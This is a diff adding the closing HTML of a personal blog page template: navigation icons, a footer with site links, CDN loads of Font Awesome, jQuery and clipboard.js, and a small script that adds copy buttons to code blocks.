+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    wude
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/me">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
